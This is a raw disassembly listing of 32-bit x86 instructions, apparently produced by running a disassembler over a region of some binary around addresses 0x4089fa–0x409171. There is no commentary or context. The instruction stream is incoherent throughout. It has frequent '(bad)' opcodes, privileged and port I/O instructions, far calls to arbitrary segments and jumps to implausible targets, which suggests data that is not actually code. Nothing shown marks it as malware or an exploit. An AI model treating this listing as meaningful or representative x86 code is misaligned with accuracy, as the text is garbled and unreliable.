  4089fa:	(bad)  
  4089fb:	(bad)  
  4089fc:	inc    ebp
  4089fd:	inc    edi
  4089fe:	dec    ebx
  4089ff:	(bad)  
  408a00:	sti    
  408a01:	and    al,0x1a
  408a03:	add    ebp,esp
  408a05:	fcmovb st,st(4)
  408a07:	sbb    BYTE PTR ds:0x82bc4a1b,dl
  408a0d:	xchg   BYTE PTR ds:[ecx+0xc],dl
  408a11:	in     eax,dx
  408a12:	dec    ebp
  408a13:	call   0xa12708a6
  408a18:	leave  
  408a19:	inc    esi
  408a1a:	mov    ds:0xda6f8013,al
  408a1f:	push   ecx
  408a20:	jbe    0x408a38
  408a22:	retf   0x70ad
  408a25:	jbe    0x4089cf
  408a27:	call   0x5e1bf278
  408a2c:	out    0x8b,eax
  408a2e:	xchg   edx,eax
  408a2f:	mov    dh,0x93
  408a31:	stc    
  408a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a33:	loop   0x4089c0
  408a35:	fistp  QWORD PTR [ebx-0x5bd3b0c8]
  408a3b:	inc    ebx
  408a3c:	stc    
  408a3d:	enter  0x7b54,0xaa
  408a41:	retf   
  408a42:	cwde   
  408a43:	pushw  cs
  408a45:	pop    esi
  408a46:	sub    ebp,DWORD PTR ds:0xa9287af8
  408a4c:	std    
  408a4d:	jns    0x4089d0
  408a4f:	mov    ds:0xbeda0f42,eax
  408a54:	push   ds
  408a55:	arpl   WORD PTR [eax-0x74750a6a],sp
  408a5b:	lds    esi,FWORD PTR [edx]
  408a5d:	sahf   
  408a5e:	neg    BYTE PTR [edi+ebp*1-0x6d]
  408a62:	push   esp
  408a63:	std    
  408a64:	mov    ebp,0xc89ec3cd
  408a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a6a:	retf   
  408a6b:	fcomp  DWORD PTR [ebx]
  408a6d:	pop    ebx
  408a6e:	ds data16 jns 0x408a40
  408a72:	cmp    DWORD PTR [ecx+0xd0687b3],ebx
  408a78:	jne    0x408af4
  408a7a:	cmp    DWORD PTR [ecx],edi
  408a7c:	sub    dh,BYTE PTR [eax+ecx*1-0x16b9a30a]
  408a83:	(bad)  
  408a85:	jmp    0x76bebc68
  408a8a:	xor    DWORD PTR [ecx],esi
  408a8c:	pop    ebp
  408a8d:	pop    edi
  408a8e:	ffree  st(1)
  408a90:	int3   
  408a91:	test   BYTE PTR [edx],bh
  408a93:	xlat   BYTE PTR ds:[ebx]
  408a94:	xor    eax,esi
  408a96:	push   edx
  408a97:	dec    ecx
  408a98:	inc    edi
  408a99:	add    eax,DWORD PTR [esi]
  408a9b:	leave  
  408a9c:	lds    edi,FWORD PTR [esi]
  408a9e:	scas   al,BYTE PTR es:[edi]
  408a9f:	jmp    0x82ad5eeb
  408aa4:	adc    al,0xd
  408aa6:	inc    ecx
  408aa7:	popf   
  408aa8:	push   ecx
  408aa9:	mov    bl,0x3d
  408aab:	inc    ebx
  408aac:	sub    edi,ebp
  408aae:	retf   
  408aaf:	dec    eax
  408ab0:	dec    edi
  408ab1:	div    DWORD PTR [eax-0x2f307405]
  408ab7:	mov    ds:0x8e5e02b0,eax
  408abc:	imul   DWORD PTR [ecx+0x3f76685f]
  408ac2:	not    BYTE PTR [eax+ecx*2]
  408ac5:	push   esp
  408ac6:	add    al,0x91
  408ac8:	inc    ecx
  408ac9:	out    dx,al
  408aca:	pusha  
  408acb:	push   esi
  408acc:	lods   al,BYTE PTR ds:[esi]
  408acd:	retf   0x2ce5
  408ad0:	cmp    al,0xe8
  408ad2:	(bad)  
  408ad3:	xchg   BYTE PTR [edx+0x6a],al
  408ad6:	rsqrtps xmm4,XMMWORD PTR [edx]
  408ad9:	out    dx,eax
  408ada:	test   DWORD PTR ds:0xdf1c2fd,edx
  408ae0:	xchg   ebp,eax
  408ae1:	js     0x408b20
  408ae3:	aam    0x8a
  408ae5:	dec    ebx
  408ae6:	in     eax,dx
  408ae7:	jg     0x408ac4
  408ae9:	not    DWORD PTR [ebp-0x66831cd1]
  408aef:	pop    ds
  408af0:	jle    0x408b33
  408af2:	fmul   DWORD PTR ds:0xe6fb1898
  408af8:	jo     0x408b78
  408afa:	ja     0x408ad7
  408afc:	pusha  
  408afd:	xchg   ebp,eax
  408afe:	pop    eax
  408aff:	mov    ch,0xe7
  408b01:	aas    
  408b02:	jmp    DWORD PTR [edi]
  408b04:	shr    DWORD PTR [edx],1
  408b06:	mov    ebx,0x545ea470
  408b0b:	pop    eax
  408b0c:	stos   DWORD PTR es:[edi],eax
  408b0d:	nop
  408b0e:	mov    edx,DWORD PTR [ecx+0xe9213c]
  408b14:	popa   
  408b15:	and    eax,0x8e23db50
  408b1a:	inc    esp
  408b1b:	test   al,0xa
  408b1d:	jb     0x408aee
  408b1f:	imul   DWORD PTR [edi]
  408b21:	xchg   ebp,eax
  408b22:	cmp    cl,BYTE PTR [ecx]
  408b24:	mov    ecx,fs
  408b26:	test   DWORD PTR [edi-0xb],esp
  408b29:	add    DWORD PTR [eax+0x3d],eax
  408b2c:	cmp    DWORD PTR [edx-0x10247677],ecx
  408b32:	call   0xb3d6:0xfdb30238
  408b39:	in     al,dx
  408b3a:	dec    ecx
  408b3b:	ds retf 
  408b3d:	mov    cl,0x2
  408b3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b40:	xor    eax,0xf311e0e3
  408b45:	push   ebp
  408b46:	xor    DWORD PTR [ebp+0x4d],0x1d
  408b4a:	mov    cr4,eax
  408b4d:	shr    BYTE PTR [ebp+0x57],0x8d
  408b51:	xor    BYTE PTR [esi],bl
  408b53:	jge    0x408ba3
  408b55:	push   edi
  408b56:	fwait
  408b57:	clc    
  408b58:	mov    ch,0x9f
  408b5a:	cdq    
  408b5b:	cmp    eax,0xc53188c7
  408b60:	pop    edx
  408b61:	inc    ebx
  408b62:	adc    al,0x6
  408b64:	xchg   esp,ebx
  408b66:	jmp    0xf22c0edb
  408b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b6c:	imul   edx,DWORD PTR [ebx+esi*8-0xb],0x64
  408b71:	mov    eax,ds:0x232a5db4
  408b76:	and    al,0x82
  408b78:	mov    ebp,0xbf764baa
  408b7d:	dec    ebp
  408b7e:	mov    edi,DWORD PTR [ecx+esi*8+0x591203ac]
  408b85:	gs test dh,al
  408b88:	adc    ah,bh
  408b8a:	aad    0xe3
  408b8c:	mov    edi,DWORD PTR [edi-0x67]
  408b8f:	jl     0x408b13
  408b91:	mov    bh,0x3c
  408b93:	fwait
  408b94:	into   
  408b95:	arpl   bx,sp
  408b97:	pop    esi
  408b98:	retf   0x2d1f
  408b9b:	add    bh,cl
  408b9d:	cmp    dl,bl
  408b9f:	cdq    
  408ba0:	jae    0x408bcf
  408ba2:	clc    
  408ba3:	int    0xac
  408ba5:	repnz inc edx
  408ba7:	arpl   WORD PTR ds:0x986a4178,sp
  408bad:	gs popf 
  408baf:	retf   0x1210
  408bb2:	inc    esp
  408bb3:	ins    BYTE PTR es:[edi],dx
  408bb4:	cli    
  408bb5:	adc    eax,0x78
  408bb8:	add    eax,0xaf737ee9
  408bbd:	cs jecxz 0x408bc1
  408bc0:	mov    DWORD PTR [edi+0x69],esp
  408bc3:	pop    ds
  408bc4:	fst    QWORD PTR [ecx+0x6b]
  408bc7:	cmp    esi,DWORD PTR [edx]
  408bc9:	xlat   BYTE PTR ds:[ebx]
  408bca:	imul   ebp,DWORD PTR [ebx+0x2d],0x6d
  408bce:	stc    
  408bcf:	mov    dl,BYTE PTR [edx-0x27338e26]
  408bd5:	out    0xd2,al
  408bd7:	mov    ebx,0x9ebf041e
  408bdc:	sbb    DWORD PTR [edi+edi*4+0x5875b1c5],edx
  408be3:	in     eax,0xc7
  408be5:	cld    
  408be6:	inc    edx
  408be7:	fwait
  408be8:	push   cs
  408be9:	sub    esi,eax
  408beb:	mov    ebx,0xa9b92faa
  408bf0:	pushf  
  408bf1:	aaa    
  408bf2:	std    
  408bf3:	repz or BYTE PTR [esi+0x0],cl
  408bf7:	test   BYTE PTR [eax-0x8296de5],dl
  408bfd:	stos   DWORD PTR es:[edi],eax
  408bfe:	test   eax,0x536011d5
  408c03:	in     eax,0x36
  408c05:	inc    ecx
  408c06:	mov    ah,dh
  408c08:	in     eax,dx
  408c09:	cmp    al,0x55
  408c0b:	xor    eax,0xe5944b54
  408c10:	inc    esi
  408c11:	pop    edx
  408c12:	and    BYTE PTR [edx],al
  408c14:	inc    ecx
  408c15:	or     eax,0x68a8a4df
  408c1a:	xchg   esp,eax
  408c1b:	neg    DWORD PTR [ecx+edi*1+0x22]
  408c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c20:	ins    BYTE PTR es:[edi],dx
  408c21:	jns    0x408c70
  408c23:	out    dx,eax
  408c24:	aas    
  408c25:	jecxz  0x408c5d
  408c27:	jbe    0x408bbc
  408c29:	shl    DWORD PTR [esp+edx*4-0xe7948ae],0x46
  408c31:	xchg   esp,eax
  408c32:	push   edx
  408c33:	ret    
  408c34:	pop    ss
  408c35:	mov    ch,0xca
  408c37:	jecxz  0x408bdf
  408c39:	add    eax,0xd45158fe
  408c3e:	add    al,BYTE PTR [eax]
  408c40:	mov    ebx,0x458ba3cf
  408c45:	loopne 0x408bd2
  408c47:	push   ebp
  408c48:	clc    
  408c49:	mov    edi,DWORD PTR [ebp-0x24]
  408c4c:	xor    edx,ecx
  408c4e:	jmp    0x408fc4
  408c53:	inc    esp
  408c54:	pusha  
  408c55:	sub    BYTE PTR [esi],bh
  408c57:	sub    BYTE PTR [esi+0x72],dl
  408c5a:	(bad)
  408c5f:	fwait
  408c60:	das    
  408c61:	jae    0x408c30
  408c63:	ins    BYTE PTR es:[edi],dx
  408c64:	in     al,0x7c
  408c66:	jl     0x408c3f
  408c68:	jns    0x408ce6
  408c6a:	jl     0x408c49
  408c6c:	mov    esp,ecx
  408c6e:	mov    ebx,DWORD PTR [ecx+0x73804640]
  408c74:	(bad)  
  408c76:	dec    esp
  408c77:	(bad)  
  408c79:	xchg   edx,eax
  408c7a:	pop    ebp
  408c7b:	or     esp,esi
  408c7d:	jecxz  0x408c31
  408c7f:	jae    0x408cac
  408c81:	push   edx
  408c82:	xor    eax,0x71a289c5
  408c87:	inc    ecx
  408c88:	sahf   
  408c89:	(bad)  
  408c8a:	cli    
  408c8b:	call   DWORD PTR [esi-0x695f9f8b]
  408c91:	pop    esp
  408c92:	in     al,0x7f
  408c94:	mov    eax,esp
  408c96:	in     eax,0xf8
  408c98:	loop   0x408d0b
  408c9a:	repnz adc edi,DWORD PTR [eax]
  408c9d:	sub    DWORD PTR [eax],esi
  408c9f:	lods   al,BYTE PTR ds:[esi]
  408ca0:	ficomp WORD PTR [esp+ecx*8]
  408ca3:	mov    DWORD PTR [edx+0x3507a399],ebx
  408ca9:	cwde   
  408caa:	enter  0xfbc0,0x5
  408cae:	lea    ebx,[esi+esi*2]
  408cb1:	in     eax,0x77
  408cb3:	jl     0x408c5a
  408cb5:	add    al,0x55
  408cb7:	fdivrp st(2),st
  408cb9:	mov    bh,0xb7
  408cbb:	mul    dh
  408cbd:	adc    eax,0x3c9ffb6e
  408cc2:	push   eax
  408cc3:	out    dx,al
  408cc4:	sub    esp,esi
  408cc6:	addr16 call 0xb1:0xd86fbd25
  408cce:	ins    DWORD PTR es:[edi],dx
  408ccf:	jae    0x408c6d
  408cd1:	xor    eax,0x144a4caa
  408cd6:	sub    ch,BYTE PTR [eax]
  408cd8:	mov    edx,0x9ee0128c
  408cdd:	ins    BYTE PTR es:[edi],dx
  408cde:	and    al,0xbd
  408ce0:	and    ebx,ebp
  408ce2:	enter  0xdd6e,0x7
  408ce6:	scas   eax,DWORD PTR es:[edi]
  408ce7:	or     DWORD PTR [ebp-0x61648278],ebx
  408ced:	test   DWORD PTR [edx-0x21],ebp
  408cf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cf1:	adc    ebp,ecx
  408cf3:	pop    edx
  408cf4:	dec    ebp
  408cf5:	add    dl,BYTE PTR [ecx+0x41]
  408cf8:	jne    0x408d4d
  408cfa:	sbb    eax,0x9b81663f
  408cff:	cmp    DWORD PTR [esi+eax*4-0x160c1256],ebx
  408d06:	bound  esp,QWORD PTR [ecx-0x2737fc02]
  408d0c:	and    ebx,DWORD PTR [ecx]
  408d0e:	ja     0x408d43
  408d10:	inc    esp
  408d11:	push   eax
  408d12:	test   DWORD PTR [ecx-0x5f],eax
  408d15:	mov    dl,0x9a
  408d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d18:	mov    ebp,0x77fa3186
  408d1d:	call   0x7b83:0xf521d2bf
  408d24:	fnstenv [edx]
  408d26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d27:	lods   eax,DWORD PTR ds:[esi]
  408d28:	xor    al,0x56
  408d2a:	enter  0xf529,0x6b
  408d2e:	adc    BYTE PTR [edi],0x34
  408d31:	pop    es
  408d32:	stos   DWORD PTR es:[edi],eax
  408d33:	sub    DWORD PTR [ebp-0x7893959d],ebp
  408d39:	daa    
  408d3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d3b:	(bad)  
  408d3c:	scas   al,BYTE PTR es:[edi]
  408d3d:	adc    al,BYTE PTR [ebx]
  408d3f:	and    BYTE PTR [edx+ebx*4-0x13],cl
  408d43:	das    
  408d44:	and    DWORD PTR [ebx+0x1025c923],ebx
  408d4a:	add    eax,0x5f76f4f9
  408d4f:	test   al,0x6c
  408d51:	dec    eax
  408d52:	fst    DWORD PTR [esi+0x42]
  408d55:	inc    eax
  408d56:	lock shl DWORD PTR [esi+0x366d3fc5],1
  408d5d:	ret    
  408d5e:	cmp    cl,dl
  408d60:	jmp    0xe6e54401
  408d65:	mov    ch,0x6e
  408d67:	and    BYTE PTR [esi],dh
  408d69:	sbb    edi,DWORD PTR [eax-0x6d778d2c]
  408d6f:	push   0xe4eb6cd6
  408d74:	dec    eax
  408d75:	xor    DWORD PTR [esi-0x74],eax
  408d78:	dec    edx
  408d79:	push   0xffffffff
  408d7b:	xchg   esi,eax
  408d7c:	fcom   QWORD PTR [esi]
  408d7e:	mov    dh,0x8a
  408d80:	mov    bl,0x14
  408d82:	xchg   ebp,eax
  408d83:	ret    
  408d84:	rcr    DWORD PTR [ebx+ecx*1-0x38624c28],1
  408d8b:	scas   eax,DWORD PTR es:[edi]
  408d8c:	xchg   esi,eax
  408d8d:	jg     0x408d2d
  408d8f:	loop   0x408dc8
  408d91:	xor    eax,0xb1717b50
  408d96:	retf   
  408d97:	jbe    0x408e03
  408d99:	mov    eax,0x4ef789f5
  408d9e:	sub    al,0x66
  408da0:	sub    eax,0x8d6fc3f
  408da5:	and    dl,al
  408da7:	mov    esi,0xbe18a6bc
  408dac:	add    ah,BYTE PTR [eax+0x59]
  408daf:	mov    al,ds:0x1d233730
  408db4:	call   0x1881fce
  408db9:	xor    eax,edx
  408dbb:	loopne 0x408d58
  408dbd:	cmp    edi,ebx
  408dbf:	outs   dx,BYTE PTR ds:[esi]
  408dc0:	add    al,0x22
  408dc2:	ja     0x408d5c
  408dc4:	add    cl,al
  408dc6:	push   ecx
  408dc7:	push   es
  408dc8:	mov    eax,esp
  408dca:	xchg   ebx,eax
  408dcb:	ficomp DWORD PTR [ecx]
  408dcd:	xor    ah,BYTE PTR [ebx+0x751284e2]
  408dd3:	or     DWORD PTR [eax],ebx
  408dd5:	and    ch,BYTE PTR [edx]
  408dd7:	lahf   
  408dd8:	and    al,0x50
  408dda:	push   0x88fead3e
  408ddf:	hlt    
  408de0:	aaa    
  408de1:	test   al,0xfb
  408de3:	jmp    0x408e3b
  408de5:	adc    al,0x22
  408de7:	adc    BYTE PTR cs:[esi+0x635b4a2b],dh
  408dee:	je     0x408d9e
  408df0:	or     edx,DWORD PTR [ecx+0x63]
  408df3:	je     0x408e03
  408df5:	fs pop ebp
  408df7:	in     al,0x3a
  408df9:	fadd   QWORD PTR ds:0xaa521985
  408dff:	int    0x2b
  408e01:	cmp    edx,DWORD PTR [ecx+0x43a8dbbb]
  408e07:	sub    esi,edx
  408e09:	cmc    
  408e0a:	mov    edx,0xeb794230
  408e0f:	aad    0x18
  408e11:	mov    al,0x19
  408e13:	in     al,dx
  408e14:	repz or ch,0x6a
  408e18:	(bad)  [ebx+0x7087bc28]
  408e1e:	lea    ebx,[edi-0x2415639d]
  408e24:	shl    DWORD PTR [ebx],cl
  408e26:	dec    ebp
  408e27:	add    cl,ch
  408e29:	or     edi,DWORD PTR [esi]
  408e2b:	xchg   BYTE PTR [esp+eax*8],bh
  408e2e:	push   esp
  408e2f:	inc    eax
  408e30:	repnz aas 
  408e32:	aad    0x41
  408e34:	das    
  408e35:	xor    DWORD PTR [ebx+0x3c3ac011],esi
  408e3b:	add    BYTE PTR [edx-0x15cc5d33],bl
  408e41:	fisub  DWORD PTR [edi+0x4c]
  408e44:	lds    ecx,FWORD PTR [eax-0x5f]
  408e47:	scas   eax,DWORD PTR es:[edi]
  408e48:	xchg   ebx,eax
  408e49:	(bad)  
  408e4a:	mov    ds:0xb4e0a6f9,eax
  408e4f:	ja     0x408ecc
  408e51:	mov    eax,ds:0xe17ee0f1
  408e56:	outs   dx,BYTE PTR ds:[esi]
  408e57:	les    ebp,FWORD PTR [eax-0x7815a5f]
  408e5d:	or     DWORD PTR [ecx-0x2c],edi
  408e60:	mov    ah,BYTE PTR [esi]
  408e62:	js     0x408edf
  408e64:	es cmp al,0xee
  408e67:	mov    dl,0x62
  408e69:	or     BYTE PTR [ebx+0x7c],ah
  408e6c:	ret    0xa112
  408e6f:	js     0x408eab
  408e71:	sub    al,0xb9
  408e73:	xlat   BYTE PTR ds:[ebx]
  408e74:	push   0x7
  408e76:	inc    ebx
  408e77:	call   0x2462:0xd80e2969
  408e7e:	push   eax
  408e7f:	push   ebp
  408e80:	inc    edi
  408e81:	push   cs
  408e82:	mov    bl,0x46
  408e84:	daa    
  408e85:	popa   
  408e86:	pop    esp
  408e87:	outs   dx,BYTE PTR ds:[esi]
  408e88:	lods   al,BYTE PTR ds:[esi]
  408e89:	and    DWORD PTR [ebx+0x5d],esi
  408e8c:	jno    0x408ea4
  408e8e:	push   cs
  408e8f:	pop    eax
  408e90:	shl    DWORD PTR [ecx],1
  408e92:	call   0xba26:0x6967fcd1
  408e99:	or     dl,al
  408e9b:	and    dl,BYTE PTR [eax-0x24]
  408e9e:	dec    ecx
  408e9f:	sub    eax,DWORD PTR [ebx+0x31]
  408ea2:	rol    BYTE PTR [ebp-0x70d3bd4a],0xe9
  408ea9:	push   edi
  408eaa:	je     0x408ec7
  408eac:	mov    BYTE PTR [ebx-0x4a80cd1e],dh
  408eb2:	cmc    
  408eb3:	or     ah,BYTE PTR [edx+0x79]
  408eb6:	adc    al,0x29
  408eb8:	sbb    ch,BYTE PTR [eax+0x50a3356f]
  408ebe:	int3   
  408ebf:	sbb    ecx,ebp
  408ec1:	add    eax,0xff91d4ed
  408ec6:	xchg   esi,eax
  408ec7:	add    eax,0x592f6522
  408ecc:	and    edx,DWORD PTR [edx]
  408ece:	dec    edi
  408ecf:	fwait
  408ed0:	pushf  
  408ed1:	push   ss
  408ed2:	xor    dl,bl
  408ed4:	pop    esp
  408ed5:	out    dx,al
  408ed6:	adc    ch,ah
  408ed8:	cmp    ebx,DWORD PTR gs:[edx+0x52]
  408edc:	adc    bh,BYTE PTR [esp+eax*1-0x4a]
  408ee0:	in     eax,0x6a
  408ee2:	mov    DWORD PTR [eax-0x211ffdde],eax
  408ee8:	mov    al,0x32
  408eea:	hlt    
  408eeb:	fst    DWORD PTR [ebp+0x5b]
  408eee:	arpl   WORD PTR fs:[ecx-0x48],bp
  408ef2:	out    0x74,eax
  408ef4:	pop    ds
  408ef5:	int    0xdf
  408ef7:	sbb    bh,ch
  408ef9:	lock jo 0x408eeb
  408efc:	cli    
  408efd:	pop    eax
  408efe:	gs pop ss
  408f00:	in     al,0x23
  408f02:	je     0x408f2c
  408f04:	and    edi,eax
  408f06:	sub    ecx,ecx
  408f08:	rol    DWORD PTR [edi],cl
  408f0a:	lea    esp,[ebx]
  408f0c:	data16 arpl WORD PTR ss:[eax+0x62f9cc26],bp
  408f14:	sbb    ecx,esi
  408f16:	xchg   ebp,eax
  408f17:	or     DWORD PTR [ecx],ebp
  408f19:	or     al,BYTE PTR [ecx-0x4ed0688a]
  408f1f:	mov    ah,0x33
  408f21:	inc    edx
  408f22:	inc    ebp
  408f23:	xor    ah,dl
  408f25:	lock xor DWORD PTR [ecx-0x2c5d7a6],0x29915e63
  408f30:	add    ecx,DWORD PTR [eax-0x3d907b95]
  408f36:	lds    esi,FWORD PTR [eax-0x28]
  408f39:	in     al,dx
  408f3a:	adc    eax,0xb4d73b0c
  408f3f:	int    0xf0
  408f41:	repz mov ecx,0xb7885c27
  408f47:	xor    cl,BYTE PTR [ebx-0x6a38724a]
  408f4d:	hlt    
  408f4e:	cdq    
  408f4f:	cld    
  408f50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f51:	xchg   esi,eax
  408f52:	ins    DWORD PTR es:[edi],dx
  408f53:	cli    
  408f54:	mov    DWORD PTR [esi],edx
  408f56:	fisub  WORD PTR [esi-0x6e]
  408f59:	popf   
  408f5a:	mov    ds:0x76927baf,al
  408f5f:	aaa    
  408f60:	clc    
  408f61:	inc    eax
  408f62:	mov    WORD PTR [eax],es
  408f64:	adc    DWORD PTR [edx-0x75],ebx
  408f67:	js     0x408fe0
  408f69:	aad    0xf9
  408f6b:	push   ebx
  408f6c:	lods   eax,DWORD PTR ds:[esi]
  408f6d:	mov    eax,0x4a5c7145
  408f72:	ins    BYTE PTR es:[edi],dx
  408f73:	iret   
  408f74:	jnp    0x408f1c
  408f76:	bnd ret 
  408f78:	push   edx
  408f79:	pop    eax
  408f7a:	dec    eax
  408f7b:	loope  0x408fec
  408f7d:	fs (bad) 
  408f7f:	stc    
  408f80:	int3   
  408f81:	lods   al,BYTE PTR ds:[esi]
  408f82:	inc    ecx
  408f83:	aad    0xd1
  408f85:	xor    DWORD PTR [ebx+ebx*1-0x46],ebx
  408f89:	dec    ecx
  408f8a:	pushf  
  408f8b:	add    cl,al
  408f8d:	imul   edi,ecx,0xac20fa16
  408f93:	xlat   BYTE PTR ds:[ebx]
  408f94:	aas    
  408f95:	xlat   BYTE PTR ds:[ebx]
  408f96:	repz jbe 0x408f95
  408f99:	sub    bl,bh
  408f9b:	cmp    al,0x82
  408f9d:	cmp    al,0x48
  408f9f:	mov    BYTE PTR [ebp-0x73b5da76],cl
  408fa5:	sbb    ebp,esp
  408fa7:	xor    ecx,DWORD PTR [ecx+edx*2+0x5b02cd8c]
  408fae:	pop    ss
  408faf:	int3   
  408fb0:	pop    esi
  408fb1:	inc    esp
  408fb2:	jnp    0x408fd2
  408fb4:	xor    al,0xa9
  408fb6:	xor    esi,ebp
  408fb8:	mov    fs,WORD PTR [ecx+0x3f]
  408fbb:	adc    ecx,DWORD PTR [ebp-0x204ba466]
  408fc1:	pushf  
  408fc2:	rcl    BYTE PTR [ecx+0x3],cl
  408fc5:	(bad)  
  408fc6:	imul   edx,edi
  408fc9:	sub    DWORD PTR [eax],edx
  408fcb:	jmp    0x409341
  408fd0:	or     eax,0x738240b6
  408fd5:	jb     0x408fa4
  408fd7:	mov    cl,0xfd
  408fd9:	push   eax
  408fda:	sbb    DWORD PTR [esp+ebp*2+0x52],ebp
  408fde:	add    al,0x2e
  408fe0:	(bad)  
  408fe1:	loopne 0x40905f
  408fe3:	jl     0x408fbc
  408fe5:	jns    0x409063
  408fe7:	jl     0x408f7f
  408fe9:	scas   al,BYTE PTR es:[edi]
  408fea:	push   ebp
  408feb:	xor    eax,0x3714ea5c
  408ff0:	jg     0x409071
  408ff2:	dec    edi
  408ff3:	and    bh,BYTE PTR [edx]
  408ff5:	pusha  
  408ff6:	mov    ah,0xc6
  408ff8:	aad    0x31
  408ffa:	inc    edi
  408ffb:	je     0x408ff0
  408ffd:	or     al,0x43
  408fff:	inc    edx
  409000:	sub    bl,BYTE PTR [ecx+ebx*2+0x7877e165]
  409007:	je     0x408fc8
  409009:	enter  0xa72c,0x2e
  40900d:	fistp  WORD PTR [ebp+0x79eb1fa7]
  409013:	mov    ds:0xd2f2b681,al
  409018:	out    dx,eax
  409019:	daa    
  40901a:	mov    bh,0xde
  40901c:	nop
  40901d:	(bad)  
  40901e:	test   BYTE PTR [esi+edi*8-0x23],0x4e
  409023:	dec    ecx
  409024:	(bad)  [esi]
  409026:	pop    ebx
  409027:	xchg   esi,eax
  409028:	and    eax,0x6b1bb7d3
  40902d:	outs   dx,DWORD PTR ds:[esi]
  40902e:	sbb    eax,0x9423fef7
  409034:	and    ecx,edx
  409036:	sbb    esi,esi
  409038:	fwait
  409039:	dec    esp
  40903a:	and    eax,0x47f5cabc
  40903f:	pop    ecx
  409040:	push   ss
  409041:	mov    ch,BYTE PTR [edx]
  409043:	pop    ebp
  409044:	bound  ecx,QWORD PTR [edi]
  409046:	arpl   WORD PTR [ebx+eiz*4+0x5e],bp
  40904a:	and    BYTE PTR [edi+0x7287d61a],bh
  409050:	jne    0x4090c4
  409052:	in     al,0x26
  409054:	jno    0x40906e
  409056:	sahf   
  409057:	mov    ?,WORD PTR [edx]
  409059:	or     eax,0x24202d62
  40905e:	arpl   WORD PTR [esi+0x3b],bx
  409061:	loop   0x408ff7
  409063:	xor    ebp,ecx
  409065:	add    BYTE PTR [edi+ecx*2-0x6e17eb7b],ah
  40906c:	dec    ebx
  40906d:	pop    eax
  40906e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40906f:	mov    ah,0x3a
  409071:	push   ss
  409072:	cwde   
  409073:	imul   edi,DWORD PTR [ecx],0xffffffe6
  409076:	pop    ss
  409077:	xchg   ebx,eax
  409078:	imul   edi,DWORD PTR [eax],0x80e1dcd9
  40907e:	aas    
  40907f:	ins    DWORD PTR es:[edi],dx
  409080:	shr    BYTE PTR [edi-0x642bd441],1
  409086:	mov    ah,0x1a
  409088:	jne    0x4090a3
  40908a:	scas   al,BYTE PTR es:[edi]
  40908b:	push   esp
  40908c:	in     al,dx
  40908d:	test   al,0xe7
  40908f:	inc    edi
  409090:	mov    ebp,0xbc9bb298
  409095:	test   bl,al
  409097:	sbb    al,0x5e
  409099:	loope  0x409022
  40909b:	xchg   ebp,eax
  40909c:	pop    ebp
  40909d:	cwde   
  40909e:	jl     0x40906b
  4090a0:	pop    edi
  4090a1:	daa    
  4090a2:	push   ebx
  4090a3:	enter  0xa9e4,0xde
  4090a7:	and    DWORD PTR [eax-0x15],ecx
  4090aa:	mov    cl,0x22
  4090ac:	js     0x4090a7
  4090ae:	cmp    al,0x6e
  4090b0:	lods   al,BYTE PTR ds:[esi]
  4090b1:	mov    dl,0x7b
  4090b3:	iret   
  4090b4:	lock in al,0x2c
  4090b7:	cmp    BYTE PTR [ecx+0x7eec42d5],ah
  4090bd:	ret    0x2bd7
  4090c0:	inc    esi
  4090c1:	push   ds
  4090c2:	jns    0x4090ee
  4090c4:	daa    
  4090c5:	(bad)  
  4090c7:	xor    al,0x14
  4090c9:	sti    
  4090ca:	sbb    dh,BYTE PTR [ecx+0x76]
  4090cd:	imul   esp,DWORD PTR [ebp+0x3c953ed4],0x17
  4090d4:	aad    0xe6
  4090d6:	pop    ss
  4090d7:	aas    
  4090d8:	xor    edi,DWORD PTR [edx]
  4090da:	test   al,0xbd
  4090dc:	(bad)  
  4090dd:	loope  0x4090a3
  4090df:	xlat   BYTE PTR ds:[ebx]
  4090e0:	or     BYTE PTR [edi],ah
  4090e2:	dec    ebx
  4090e3:	rcr    BYTE PTR [ebx-0x157a624a],cl
  4090e9:	fwait
  4090ea:	dec    esp
  4090eb:	sub    edx,DWORD PTR [ebp-0x44]
  4090ee:	xlat   BYTE PTR ds:[ebx]
  4090ef:	mov    esi,0x15a07697
  4090f4:	fadd   QWORD PTR [esi+eax*1+0x39]
  4090f8:	push   DWORD PTR [ecx]
  4090fa:	mov    ecx,0xe416cda3
  4090ff:	push   ebx
  409100:	cmovge edx,DWORD PTR [edi+0x2e]
  409104:	sbb    al,0x10
  409106:	mov    cl,0x50
  409108:	in     al,dx
  409109:	sti    
  40910a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40910b:	push   ebp
  40910c:	loop   0x40915e
  40910e:	jmp    DWORD PTR [ecx-0x1f47411d]
  409114:	sub    al,0xef
  409116:	adc    al,BYTE PTR [edx]
  409118:	jp     0x4090ea
  40911a:	jl     0x409114
  40911c:	ret    0xd2dc
  40911f:	inc    edi
  409120:	xor    DWORD PTR [ecx+0x6e9e2d08],0x69
  409127:	adc    al,0x28
  409129:	push   esi
  40912a:	cmp    ah,bl
  40912c:	dec    ebx
  40912d:	mov    dh,0x8e
  40912f:	call   0x7584:0x42fd37b2
  409136:	ss cmc 
  409138:	and    DWORD PTR ds:0xe78c30ee,0xffffffd6
  40913f:	out    dx,al
  409140:	(bad)  
  409141:	mov    ds:0x17bebeb3,al
  409146:	or     bl,ah
  409148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409149:	cmp    ebp,DWORD PTR [ecx+ebx*1+0x629321a9]
  409150:	loop   0x40912a
  409152:	push   ecx
  409153:	aad    0xf0
  409155:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409156:	xchg   ebx,eax
  409157:	(bad)  
  409158:	sub    eax,0xfe2c77f1
  40915d:	cmp    al,0x21
  40915f:	(bad)  [edi+eiz*2+0x7d4654eb]
  409166:	xchg   ebp,eax
  409167:	les    eax,FWORD PTR fs:[esi+eiz*8+0x41076a40]
  40916f:	adc    ebp,ebp
  409171:	cwde   
